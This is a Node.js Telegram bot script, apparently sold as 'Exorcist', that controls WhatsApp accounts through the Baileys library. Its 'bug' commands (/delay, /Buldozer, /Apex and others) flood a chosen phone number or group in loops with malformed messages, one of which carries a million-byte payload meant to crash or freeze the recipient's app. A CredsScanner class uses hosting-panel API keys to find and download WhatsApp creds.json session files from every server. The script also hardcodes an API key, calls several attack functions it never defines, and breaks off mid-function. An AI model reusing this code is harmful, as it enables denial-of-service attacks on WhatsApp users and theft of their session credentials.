const fs = require('fs');
const crypto = require('crypto');
const axios = require('axios');
const config = require('./setting.js');
const TelegramBot = require('node-telegram-bot-api');
const moment = require('moment');
const Module = require('module');
const {
  default: makeWASocket,
  cardsCrL,
  chatId,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@whiskeysockets/baileys');
const readline = require('readline');
const P = require('pino');
const path = require('path');
const chalk = require('chalk');
const version = '1.0';
const bot = new TelegramBot(config.BOT_TOKEN, { polling: true });
let isValid = false;
const IsOwner = (id) => { return config.OWNER_ID.includes(id.toString()) }
//==================================\\
const progressStages = [
    "[░░░░░░░░░░]",
    "[█░░░░░░░░░]",
    "[██░░░░░░░░]",
    "[███░░░░░░░]",
    "[████░░░░░░]",
    "[█████░░░░░]",
    "[██████░░░░]",
    "[███████░░░]",
    "[████████░░]",
    "[█████████░]",
    "[██████████]",
  ];
const image = "https://api.nefyu.my.id/api/waifu-sfw/megumin" || 'https://cdn.jsdelivr.net/gh/ARCHI-BOT/Jamesssss@main/ab67616d0000b2739f37677cde6936ed1e7768c2.jpeg';
bot.on('message', (msg) => {
  if (!isValid) return;
  const userId = msg.from.id;
  const userData = { id: userId, name: msg.from.first_name };
  console.log(`-----------------\n\x1b[32m[TELEGRAM]\x1b[0m\nUser: ${msg.from.id}\nCommand: ${msg.text}\n-----------------\n`);
  });
//=======================================//
function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
function timer(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
//===================================//
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  const parts = [];
  if (days > 0) parts.push(`${days} Day${days > 1 ? 's' : ''}`);
  if (hours > 0) parts.push(`${hours} Hour${hours > 1 ? 's' : ''}`);
  if (minutes > 0) parts.push(`${minutes} Min${minutes > 1 ? 's' : ''}`);
  if (secs > 0 || parts.length === 0) parts.push(`${secs} Sec${secs > 1 ? 's' : ''}`);

  return parts.join(', ');
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}
//===================================//
    class CredsScanner {
    constructor(domain, plta, pltc) {
        this.domain = domain.replace(/\/+$/, "");
        this.plta = plta;
        this.pltc = pltc;
        this.foundFiles = [];
    }

    async scanDirectory(identifier, dir = "/") {
        try {
            const listRes = await axios.get(`${this.domain}/api/client/servers/${identifier}/files/list`, {
                params: { directory: dir },
                headers: { 
                    Accept: "application/json", 
                    Authorization: `Bearer ${this.pltc}` 
                },
                timeout: 10000
            });
            
            const listJson = listRes.data;
            if (!listJson || !Array.isArray(listJson.data)) return;
            
            for (let item of listJson.data) {
                const name = (item.attributes && item.attributes.name) || item.name || "";
                const itemPath = (dir === "/" ? "" : dir) + "/" + name;
                const normalized = itemPath.replace(/\/+/g, "/");
                
                let isDir = false;
                if (name === 'session' || name === 'sessions' || name === 'sesion' || 
                    name === 'sesi' || name === 'sessi' || name === 'sesinya') {
                    try {
                        await axios.get(`${this.domain}/api/client/servers/${identifier}/files/list`, {
                            params: { directory: normalized },
                            headers: { 
                                Accept: "application/json", 
                                Authorization: `Bearer ${this.pltc}` 
                            },
                            timeout: 3000
                        });
                        isDir = true;
                    } catch (e) {}
                }
                
                if (!isDir && name === "creds.json") {
                    this.foundFiles.push({
                        path: normalized,
                        name: name,
                        serverIdentifier: identifier,
                        fullPath: normalized
                    });
                }
                
                if (isDir) {
                    await this.scanDirectory(identifier, normalized === "" ? "/" : normalized);
                }
            }
        } catch (error) {}
    }

    async getFileContent(identifier, filePath) {
        try {
            const downloadRes = await axios.get(`${this.domain}/api/client/servers/${identifier}/files/download`, {
                params: { file: filePath },
                headers: { 
                    Accept: "application/json", 
                    Authorization: `Bearer ${this.pltc}` 
                },
                timeout: 10000
            });
            
            const dlJson = downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
                const url = dlJson.attributes.url;
                const fileRes = await axios.get(url, {
                  responseType: "arraybuffer",
                  timeout: 10000
                });
                const buffer = Buffer.from(fileRes.data);
                return buffer.toString();
            }
        } catch (error) {
            return `Error: ${error.message}`;
        }
        return null;
    }

    async scanAllServers() {
        try {
            const res = await axios.get(`${this.domain}/api/application/servers`, {
                headers: { 
                    Accept: "application/json", 
                    Authorization: `Bearer ${this.plta}` 
                },
                timeout: 10000
            });
            
            const data = res.data;
            if (!data || !Array.isArray(data.data)) {
                return {
                  success: false,
                  error: "Gagal ambil list server"
                };
            }
            
            for (let srv of data.data) {
                const identifier = (srv.attributes && srv.attributes.identifier) || srv.identifier || (srv.attributes && srv.attributes.id);
                const name = (srv.attributes && srv.attributes.name) || srv.name || identifier || "unknown";
                
                if (!identifier) continue;
                
                await this.scanDirectory(identifier, "/");
            }
            
            const resultsWithContent = [];
            for (let file of this.foundFiles) {
                const rawContent = await this.getFileContent(file.serverIdentifier, file.path);
                resultsWithContent.push({
                    server: file.serverIdentifier,
                    path: file.path,
                    raw_content: rawContent
                });
            }
            
            return {
                success: true,
                totalFound: this.foundFiles.length,
                results: resultsWithContent
            };
            
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }

    async getFormattedResults() {
        const result = await this.scanAllServers();
        
        if (!result.success) {
            return result;
        }

        const apiResponse = {
            status: "success",
            total_files: result.totalFound,
            scan_timestamp: new Date().toISOString(),
            files: result.results.map(file => ({
                server_id: file.server,
                file_path: file.path,
                credentials: file.raw_content
            }))
        };

        return apiResponse;
    }
}
//=======================================//
bot.setMyCommands([{ command: 'start', description: 'Mulai bot' }]);
//===================================//
const sessions = new Map();
const SESSIONS_DIR = "./animus";
const SESSIONS_FILE = "./animus/active_sessions.json";
function isWhatsAppConnected() {
  return sessions.size > 0;
}
function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ FOUND ACTIVE WHATSAPP SESSION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ ⌬ TOTAL : ${activeNumbers.length}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);

      for (const botNumber of activeNumbers) {
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: false,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ SUCCESSFUL NUMBER CONNECTION
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ TRY RECONNECTING THE NUMBER
┣━━━━━━━━━━━━━━━━━━━━━━━━━━━
┃ NUMBER : ${botNumber}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("CONNECTION CLOSED"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}
function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}
async function connectToWhatsApp(botNumber, chatId, austh = null) {
let idmsg;
try {
  const statusMessage = await bot.sendMessage(
    chatId,
    `<pre>╭───⪼
│ϟ Number : ${botNumber}
│ϟ Status : PROSES
╰───⪼</pre>`,
    { parse_mode: 'HTML' }
  );
  idmsg = statusMessage.message_id;

  const sessionDir = createSessionDir(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
   const  sock = makeWASocket({
    auth: austh || state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
});

    sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `<pre>╭───⪼
│ϟ Number : ${botNumber}
│ϟ Status : CLOSE
╰───⪼</pre>
`,
          {
            chat_id: chatId,
            message_id: idmsg,
            parse_mode: 'HTML',
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `<pre>╭───⪼
│ϟ Number : ${botNumber}
│ϟ Status : ERROR 
╰───⪼</pre>
`,
          {
            chat_id: chatId,
            message_id: idmsg,
            parse_mode: 'HTML',
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === 'open') {
    sessions.set(botNumber, sock);
    saveActiveSessions(botNumber);
      await bot.editMessageText(
        `<pre>╭───⪼
│ϟ Number : ${botNumber}
│ϟ Status : SUCCES
╰───⪼</pre>
`,
        {
          chat_id: chatId,
          message_id: idmsg,
          parse_mode: 'HTML',
        }
      );
      console.log(
        chalk.white.bold(`${chalk.green.bold('WHATSAPP TERHUBUNG')}`)
      );
    } else if (connection === 'connecting') {
    try {
    if (!fs.existsSync(`${sessionDir}/creds.json`)) {
      await new Promise((resolve) => setTimeout(resolve, 3000));
      
          let customCode = 'EXORCIST';
          const code = await sock.requestPairingCode(botNumber, customCode);
          const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
          await bot.editMessageText(
            `<pre>╭───⪼
│ϟ Number : ${botNumber}
│ϟ Code : ${formattedCode}
╰───⪼</pre>
`,
            {
              chat_id: chatId,
              message_id: idmsg,
              parse_mode: 'HTML',
            }
          );
        }
      } catch (error) {
        console.error('Error requesting pairing code:', error);
        await bot.editMessageText(
          `<pre>╭───⪼
│ϟ Number : ${botNumber}
│ϟ Status : Error Requested Pairing
╰───⪼</pre>
`,
          {
            chat_id: chatId,
            message_id: idmsg,
            parse_mode: 'HTML',
          }
        );
    }
    }
  }); 

    sock.ev.on('creds.update', saveCreds);
    return sock;
  } catch (error) {
    console.error('Initialization error:', error);
    await bot.editMessageText(
      `<pre>╭───⪼
│ϟ Number : ${botNumber}
│ϟ Status : INIT ERROR
╰───⪼</pre>`,
      {
        chat_id: chatId,
        message_id: idmsg,
        parse_mode: 'HTML',
      }
    );
    throw error;
  }
}


//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
const CONFIG = {
    GITHUB_URL: 'https://raw.githubusercontent.com/ARCHI-BOT/Sigma/main/index.js',
    SELF_PATH: __filename
};
async function fetchAndValidateToken() {
const JSONBIN_API_KEY = '$2a$10$9BBcoEbNaivOYDtMTX2yYuJGReZgRXYyKTHCzRw4ZUBL2at8yuqZe'; 
const JSONBIN_BIN_ID = '69320d8543b1c97be9d860aa'; 
const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}/latest`;

  try {
    const response = await fetch(JSONBIN_URL, {
      headers: {
  'X-Access-Key': JSONBIN_API_KEY,
  'Content-Type': 'application/json',
  'X-Bin-Private': 'true' 
}
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const binData = await response.json();
    const validTokens = binData.record.tokens;
    if (!Array.isArray(validTokens)) {
      throw new Error('Invalid token data format');
    }

    const tanggalSekarang = new Date().toLocaleDateString('id-ID').replace(/\//g, '-');

    if (!validTokens.includes(config.BOT_TOKEN)) {
    isValid = false;
      console.log(`${chalk.green.bold("Welcome To Script Exorcist")}
꧈ Date : ${tanggalSekarang}
꧈ Status Token : ${chalk.red.bold("Error")}
꧈ Database Token : ${chalk.blue.bold("Monggo Atlas Database")}\nPlease Buy To Trusted Seller`);
   process.exit(0);
    } else {
    isValid = true;
      console.log(chalk.red.bold( 
`${chalk.green.bold("Welcome To Script Exorcist")}
꧈ Date : ${tanggalSekarang}
꧈ Status Token : ${chalk.green.bold("Valid")}
꧈ Database Token : ${chalk.blue.bold("Monggo Atlas Database")}`));
      await sleep(2000);
      initializeWhatsAppConnections();
    }
  } catch (error) {
  isValid = false
    console.error(chalk.red.bold('Error saat validasi token:', error.message));
   process.exit(1);
  }
}
fetchAndValidateToken();
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
let roles = { admin: [], prem: [] };

try {
 if (!fs.existsSync('database.json')) {
  fs.writeFileSync('database.json', JSON.stringify(roles, null, 2));
 } else {
  roles = JSON.parse(fs.readFileSync('database.json', 'utf-8'));
  }
} catch (err) {
  console.error('Gagal membaca database.json, menggunakan default roles:', err);
}
let developer = [ 5572571320 ];
const { admin, prem } = {
  admin: [...roles.admin, ...developer],
  prem: [...roles.prem, ...developer],
};
//=========================================\\
async function editmesaage(chatId, msgid, text = "none") {
try {
await bot.editMessageText(`<pre>┍━━━━━━━━━━━
┃ Status Bug : Error
┃ Target : ${target}
┃ Command : /${text}
┖━━━━━━━━━━</pre>`, {
    chat_id: chatId,
    message_id: msgid,
    parse_mode: "HTML"
})
} catch (err) {
console.error("Error", err)
}
}
//▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰//
function indonesianigga() {
const quote = [ 
  `Mohon Gunakan WhatsApp ORI Untuk Sender`,
  `Jangan Spam Bila Tidak Mau WhatsApp Terkena Banned`, 
  `Mohon Hubungi Developer Bila Ada Error`,
  `Jangan Spam Agar Terhindar Ban Sender`,
  `1 2 Makan Tongkol Jangan Spam Kontol`,
  `Archi Legacy Are Real`
];
return quote[Math.floor(Math.random() * quote.length)];
}
//=============================================//
function getUserRole(userId) {
  if (developer === userId) return '𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥';
  if (IsOwner(userId)) return '𝐎𝐖𝐍𝐄𝐑';
  if (admin.includes(userId)) return '𝐀𝐃𝐌𝐈𝐍';
  if (prem.includes(userId)) return '𝐏𝐑𝐄𝐌𝐈𝐔𝐌';
  return '𝐔𝐒𝐄𝐑 𝐁𝐈𝐀𝐒𝐀';
}
//==================[FUNC]==========================//
async function Candydelay(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "Expression Empire",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\x10".repeat(1_000_000),
              version: 3
            }
          }
        }
      }
    },
    {
      participant: { jid: target }
    }
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    {
      messageId: msg.key.id,
      participant: { jid: target }
    }
  );
}
//=============================================//
bot.onText(/\/start/, async (msg) => {  
  if (!isValid) return;
  const chatId = msg.chat.id;
  const role = getUserRole(msg.from.id);
  const username = msg.from.username ? `${msg.from.username}` : 'Tidak ada username';
  const statusKoneksi = sessions.size === 0 ? "Terputus" : "Tersambung";
  await bot.sendPhoto(chatId, image, {
    caption: `<pre>ﾒ ោ៝ 𝗘𝗫𝗢𝗥𝗖𝗜𝗦𝗧 𝗟𝗜𝗧𝗘 ༒︎</pre>
<blockquote><b>Hi @${username} You Role Is ${role}
Thanks For User Exorcist Script</b></blockquote>

<pre>𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡
➤ - 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : ${username}
➤ - 𝗥𝗨𝗡𝗧𝗜𝗠𝗘 : ${getBotRuntime()}
➤ - 𝗠𝗘𝗠𝗢𝗥𝗬 : ${formatMemory()}
➤ - 𝗦𝗘𝗡𝗗𝗘𝗥 : ${statusKoneksi}
</pre>
<pre><b>𝗤𝘂𝗼𝘁𝗲</b>
${indonesianigga()}</pre>`,
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
          [{ text: '[ 𝗧𝗢𝗢𝗟𝗦 ]', callback_data: 'tools' }, { text: "[ 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 ]", callback_data: 'bug' }],
          [{ text: '[ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ]', callback_data: 'owner' }],
          [{ text: '𝗖𝗛𝗔𝗡𝗡𝗘𝗟', url: 'https://t.me/OrArci' }],
      ],
    },
  });
await bot.sendAudio(chatId, "https://pomf2.lain.la/f/6q0lzdl0.mp3", {
    caption: 'Archi❤️‍🩹',
    title: 'ChinaTown',
});
});

//[ Case Bug ]\\
bot.onText(/\/delaybeta(?: (.+))?$/i, async (msg, match) => {

  const chatId = msg.chat.id;
  const hitam = match[1];

  try {
        if (![...config.OWNER_ID, ...prem, ...admin].includes(msg.from.id) && !IsOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '⚠️ You do not have permission to use this command.');
}
    if (!hitam)
    return bot.sendMessage(
        chatId,
        `Missing Target Example:\n${msg.text} 628374465772`
    );
if (!isWhatsAppConnected()) {
    return bot.sendMessage(chatId, 'Silahkan /addbot untuk Menambah Bot');
    }

    const target = hitam.replace(/[^0-9]/g, '');
    const formatnumber = target + '@s.whatsapp.net';

   const status = await bot.sendMessage(
      chatId,
      `<pre>┍━━━━━━━━━━━
┃ Status Bug : Sended
┃ Target : ${target}
┃ Command : /delaybeta
┖━━━━━━━━━━</pre>`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '[ TARGET ]',
                url: `https://wa.me/${target}`,
              },
            ],
          ],
        },
      }
    );
    console.log(`Start Bug To ${target}`);
    for (let i = 0; i < 5000; i++) {
      await privateZephy(formatnumber, true);
      await sleep(500)
    }
  } catch (error) {
    console.error("Error Bug:", error)
    bot.sendMessage(chatId, `Error Jier: ${error}`);
  }
});

bot.onText(/\/Buldozer(?: (.+))?$/i, async (msg, match) => {
    if (!isValid) return;
  const chatId = msg.chat.id;
  const hitam = match[1];

  try {
        if (![...config.OWNER_ID, ...prem, ...admin].includes(msg.from.id) && !IsOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '⚠️ You do not have permission to use this command.');
}
    if (!hitam)
    return bot.sendMessage(
        chatId,
        `Missing Target Example:\n${msg.text} 628374465772`
    );
if (!isWhatsAppConnected()) {
    return bot.sendMessage(chatId, 'Silahkan /addbot untuk Menambah Bot');
    }

    const target = hitam.replace(/[^0-9]/g, '');
    const formatnumber = target + '@s.whatsapp.net';

   const status = await bot.sendMessage(
      chatId,
      `<pre>┍━━━━━━━━━━━
┃ Status Bug : Sended
┃ Target : ${target}
┃ Command : /Buldozer
┖━━━━━━━━━━</pre>`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '[ TARGET ]',
                url: `https://wa.me/${target}`,
              },
            ],
          ],
        },
      }
    );
    console.log(`Start Bug To ${target}`);
    for (let i = 0; i < 5000; i++) {
      await VampSedotKuota(formatnumber);
      await sleep(2100);
    }
  } catch (error) {
    console.error("Error Bug:", error)
    
    bot.sendMessage(chatId, `Error Jier: ${error}`);
  }
});

bot.onText(/\/Nexter(?: (.+))?$/i, async (msg, match) => {
    if (!isValid) return;
  const chatId = msg.chat.id;
  const hitam = match[1];

  try {
        if (![...config.OWNER_ID, ...prem, ...admin].includes(msg.from.id) && !IsOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '⚠️ You do not have permission to use this command.');
}
    if (!hitam)
    return bot.sendMessage(
        chatId,
        `Missing Target Example:\n${msg.text} 628374465772`
    );
if (!isWhatsAppConnected()) {
    return bot.sendMessage(chatId, 'Silahkan /addbot untuk Menambah Bot');
    }

    const groupLink = match[1].trim();
  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return bot.sendMessage(chatId, "❌ Link kamu Salah\nContoh: /invisgroup https://chat.whatsapp.com/xxxx");
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

    await bot.sendMessage(chatId, "⏳ Sedang bergabung ke grup, mohon tunggu...");
    
    const groupInfo = await sock.groupAcceptInvite(groupCode);
    const groupId = groupInfo.id;

    const status = await bot.sendMessage(
      chatId,
      `<pre>┍━━━━━━━━━━━
┃ Status Bug : Sended
┃ Target : ${hitam}
┃ Command : /Nexter
┖━━━━━━━━━━</pre>`,
      {
        parse_mode: 'HTML',
      }
    );
    console.log(`Start Bug To ${groupId}`);
    for (let i = 0; i < 30; i++) {
      await XProtexXCallV6(groupId);
      await sleep(2100);
    }
  } catch (error) {
    console.error("Error Bug:", error)
    
    bot.sendMessage(chatId, `Error Jier: ${error}`);
  }
});

bot.onText(/\/Apex(?: (.+))?$/i, async (msg, match) => {
    if (!isValid) return;
  const chatId = msg.chat.id;
  const hitam = match[1];

  try {
        if (![...config.OWNER_ID, ...prem, ...admin].includes(msg.from.id) && !IsOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '⚠️ You do not have permission to use this command.');
}
    if (!hitam)
    return bot.sendMessage(
        chatId,
        `Missing Target Example:\n${msg.text} 628374465772`
    );
if (!isWhatsAppConnected()) {
    return bot.sendMessage(chatId, 'Silahkan /addbot untuk Menambah Bot');
    }

    const target = hitam.replace(/[^0-9]/g, '');
    const formatnumber = target + '@s.whatsapp.net';

    const status = await bot.sendMessage(
      chatId,
      `<pre>┍━━━━━━━━━━━
┃ Status Bug : Sended
┃ Target : ${target}
┃ Command : /Apex
┖━━━━━━━━━━</pre>`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '[ TARGET ]',
                url: `https://wa.me/${target}`,
              },
            ],
          ],
        },
      }
    );
    console.log(`Start Bug To ${target}`);
    for (let i = 0; i < 15; i++) {
      await Blank(formatnumber);
      await sleep(2500);
    }
  } catch (error) {
    console.error("Error Bug:", error)
    bot.sendMessage(chatId, `Error Jier: ${error}`);
  }
});

bot.onText(/\/delay(?: (.+))?$/i, async (msg, match) => {
    if (!isValid) return;
  const chatId = msg.chat.id;
  const hitam = match[1];

  try {
        if (![...config.OWNER_ID, ...prem, ...admin].includes(msg.from.id) && !IsOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '⚠️ You do not have permission to use this command.');
}
    if (!hitam)
    return bot.sendMessage(
        chatId,
        `Missing Target Example:\n${msg.text} 628374465772`
    );
if (!isWhatsAppConnected()) {
    return bot.sendMessage(chatId, 'Silahkan /addbot untuk Menambah Bot');
    }

    const target = hitam.replace(/[^0-9]/g, '');
    const formatnumber = target + '@s.whatsapp.net';

    const status = await bot.sendMessage(
      chatId,
      `<pre>┍━━━━━━━━━━━
┃ Status Bug : Process
┃ Target : ${target}
┃ Progres : 
┃ Command : /delay
┖━━━━━━━━━━</pre>`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '[ TARGET ]',
                url: `https://wa.me/${target}`,
              },
            ],
          ],
        },
      }
    );
for (let i = 1; i < progressStages.length; i++) {
  await sleep(1000);
  const statusText = i >= 10 ? 'Success' : 'Process';
  await bot.editMessageText(
    `<pre>┍━━━━━━━━━━━
┃ Status Bug : ${statusText}
┃ Target : ${target}
┃ Progres : ${progressStages[i]}
┃ Command : /delay
┖━━━━━━━━━━</pre>`,
    {
      chat_id: chatId,
      message_id: status.message_id,
      parse_mode: "HTML",
      reply_markup: {
          inline_keyboard: [
            [
              {
                text: '[ TARGET ]',
                url: `https://wa.me/${target}`,
              },
            ],
          ],
        },
      }
  );
}

    for (const [botNum, sock] of sessions.entries()) {
  try {
    if (!sock.user) {
      console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
      await initializeWhatsAppConnections();
      continue;
    }

    for (let i = 0; i < 200; i++) {
      await Candydelay(sock, formatnumber);
      await sleep(1000);
    }

  } catch (error) {
    console.error(`❌ Error bot ${botNum}:`, error);
  }
}
  } catch (error) {
    console.error("Error Bug:", error)
    
    bot.sendMessage(chatId, `Error Jier: ${error}`);
  }
});

bot.onText(/\/Echo(?: (.+))?$/i, async (msg, match) => {
    if (!isValid) return;
  const chatId = msg.chat.id;
  const hitam = match[1];

  try {
    if (![...config.OWNER_ID, ...prem, ...admin].includes(msg.from.id) && !IsOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '⚠️ You do not have permission to use this command.');
}
    if (!hitam)
    return bot.sendMessage(
        chatId,
        `Missing Target Example:\n${msg.text} 628374465772`
    );
if (!isWhatsAppConnected()) {
    return bot.sendMessage(chatId, 'Silahkan /addbot untuk Menambah Bot');
    }

    const target = hitam.replace(/[^0-9]/g, '');
    const formatnumber = target + '@s.whatsapp.net';

    const status = await bot.sendMessage(
      chatId,
      `<pre>┍━━━━━━━━━━━
┃ Status Bug : Sended
┃ Target : ${target}
┃ Command : /Echo
┖━━━━━━━━━━</pre>`,
      {
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '[ TARGET ]',
                url: `https://wa.me/${target}`,
              },
            ],
          ],
        },
      }
    );

    console.log(`Start Bug To ${target}`);
    for (let i = 0; i < 35; i++) {
      await coreclose2(formatnumber)
      await sleep(2100);
    }
  } catch (error) {
    console.error("Error Bug:", error)
    
    bot.sendMessage(chatId, `Error Jier: ${error}`);
  }
});

bot.onText(/\/devices/, async (msg) => {
  if (!isValid) return;
  const chatId = msg.chat.id;
  
  if (!IsOwner(msg.from.id)) {
    return bot.sendMessage(chatId, 'Restricted: Just Owner Can Access');
  }

  try {
    const originalConsoleLog = console.log;
    console.log = function() {};
    
    const statusMessage = await bot.sendMessage(chatId, "Memulai ulang perangkat...");
    
    await initializeWhatsAppConnections();

    if (isWhatsAppConnected()) {
    for (const [botNum, sock] of sessions.entries()) {
    if (!sock.user) {
      console.log(`Bot ${botNum} tidak terhubung, mencoba menghubungkan ulang...`);
      await initializeWhatsAppConnections();
      continue;
    }

      const deviceId = sock.user?.id?.split(':')[0] || 'Unknown';
      const text = `\`\`\`Status-Devices\n${deviceId} ✓\`\`\``;
      
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: statusMessage.message_id,
        parse_mode: "Markdown"
      });
     }
    } else {
    const text = `\`\`\`Status-Devices\nKosong ✓\`\`\``;
      await bot.editMessageText(text, {
        chat_id: chatId,
        parse_mode: "Markdown",
        message_id: statusMessage.message_id
      });
    }
  } catch (error) {
    console.error("Error in /devices command:", error);
    bot.sendMessage(chatId, "Terjadi error saat memproses perintah");
  }
});

bot.onText(/\/addbot(?: (.+))?$/i, async (msg, match) => {
  if (!isValid) return;
  const chatId = msg.chat.id;
  const userid = msg.from.id;
  if (!IsOwner(msg.from.id)) {
    return bot.sendMessage(msg.chat.id, 'Resricted Just Owner Can Access');
  }
  if (isWhatsAppConnected())
    return bot.sendMessage(chatId, `\`\`\`Status\nSender Ready\`\`\``, {
      parse_mode: 'Markdown',
    });
  if (!match[1]) return bot.sendMessage(chatId, 'Error Please Input Number Example\n/addbot 62878091182');

  const botNumber = match[1].replace(/[^0-9]/g, '');
  try {
    connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error Bug:", error)
